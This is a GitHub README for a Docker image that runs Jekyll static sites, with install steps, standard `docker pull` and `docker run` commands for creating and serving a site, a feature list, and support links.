# 🐳 Jekyll-Docker-Image - Run Jekyll Sites Easily

![Download Jekyll-Docker-Image](https://img.shields.io/badge/Download-Jekyll--Docker--Image-blue)

## 🚀 Getting Started

Welcome to the Jekyll-Docker-Image! This software allows you to run Jekyll sites seamlessly using Docker. With Ruby 3.4 and essential tools included, your Jekyll projects can be up and running in minutes. No programming knowledge is needed!

## 📥 Download & Install

To start, you need to download the Jekyll-Docker-Image. Visit this page to download: [Jekyll-Docker-Image Releases](https://github.com/D-webv/Jekyll-Docker-Image/releases).

1. Click the link above to go to the Releases page.
2. Look for the latest version and select it.
3. Download the Docker image files from the assets section.

Once you've downloaded the files, you can proceed to install and run the application.

## 🛠️ System Requirements

To run the Jekyll-Docker-Image, ensure you have the following:

- **Operating System**: MacOS, Linux, or Windows
- **Docker**: Installed and running on your system. 
- **Minimum Disk Space**: 1 GB free
- **RAM**: 2 GB minimum recommended

## ⚙️ How to Use Jekyll-Docker-Image

Using the Jekyll-Docker-Image is straightforward. Follow these steps to get your Jekyll site up and running:

1. Open a terminal (or command prompt on Windows).
2. Pull the Docker image by running the following command:

   ```bash
   docker pull dwebv/jekyll-docker-image
   ```

3. Once the image is pulled, you can create a new Jekyll site. Use the command:

   ```bash
   docker run --rm -v "$PWD:/srv/jekyll" -it dwebv/jekyll-docker-image jekyll new mysite
   ```

   This creates a new directory named `mysite` with the Jekyll structure.

4. To build and serve your site, navigate to your project folder and run:

   ```bash
   cd mysite
   docker run --rm -p 4000:4000 -v "$PWD:/srv/jekyll" -it dwebv/jekyll-docker-image jekyll serve
   ```

5. Now, open your browser and go to `http://localhost:4000` to view your site.

## 📚 Features

- **Easy Installation**: Just pull the image and start running.
- **Ruby 3.4 Integration**: Works smoothly with the latest Ruby version.
- **Bundler Support**: Easily install and manage your gem dependencies.
- **Lightweight**: Built on Alpine Linux for efficiency.

## ✏️ Tips

- Make sure Docker is running before executing the commands.
- If you encounter any issues, check your Docker installation for errors.
- Use `docker images` to review the images installed on your system.

## 🤝 Support

If you need help, visit the [Issues page](https://github.com/D-webv/Jekyll-Docker-Image/issues) to report problems or ask questions. 

## 🔗 Relevant Links

- **Documentation**: [Jekyll Documentation](https://jekyllrb.com/docs/)
- **Docker Documentation**: [Docker Docs](https://docs.docker.com/)

For updates and additional information, always refer to the [Jekyll-Docker-Image Releases](https://github.com/D-webv/Jekyll-Docker-Image/releases).